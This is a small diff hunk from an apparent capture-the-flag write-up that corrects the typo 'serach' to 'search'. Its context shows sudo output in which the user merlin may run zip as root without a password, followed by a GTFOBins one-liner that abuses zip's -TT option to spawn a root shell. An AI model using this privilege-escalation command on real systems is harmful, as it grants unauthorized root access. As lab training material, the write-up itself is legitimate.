@@ -192,7 +192,7 @@ Matching Defaults entries for merlin on ubuntu:
 User merlin may run the following commands on ubuntu:
     (root : root) NOPASSWD: /usr/bin/zip
 ```
-A quick serach in <a href="https://gtfobins.github.io/gtfobins/zip/">gftobins</a> gave me all I needed:
+A quick search in <a href="https://gtfobins.github.io/gtfobins/zip/">gftobins</a> gave me all I needed:
 ```bash
 $ TF=$(mktemp -u)
 $ sudo zip $TF /etc/hosts -T -TT 'sh #'
